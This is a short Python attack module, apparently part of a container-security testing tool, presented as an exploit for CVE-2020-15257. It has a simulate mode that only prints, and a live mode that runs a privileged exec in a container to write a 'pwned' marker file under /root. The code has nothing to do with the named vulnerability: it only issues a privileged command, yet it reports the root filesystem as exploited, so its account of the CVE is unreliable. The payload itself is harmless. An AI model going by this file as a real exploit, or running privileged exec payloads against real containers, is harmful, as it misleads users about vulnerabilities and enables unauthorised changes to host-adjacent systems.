# attacks/cve_2020_15257.py

def run(container, simulate=False):
    print("[*] Running CVE-2020-15257 exploit...")

    if simulate:
        print(f"[SIMULATE] Would attempt to overwrite root filesystem inside privileged container '{container.name}'")
        print("[SIMULATE] Example payload: write /root/pwned_by_15257.txt")
        return "Simulated run: No changes made."

    try:
        # ⚠️ REAL PAYLOAD EXECUTION
        # Write to root-owned path, requires --privileged container
        command = "echo 'pwned by CVE-2020-15257' > /root/pwned_by_15257.txt"
        container.exec_run(command, privileged=True)

        print("[+] Payload written to /root/pwned_by_15257.txt")
        return "Executed: root FS modified"

    except Exception as e:
        print(f"[!] Exploit failed: {e}")
        return f"Failed: {str(e)}"
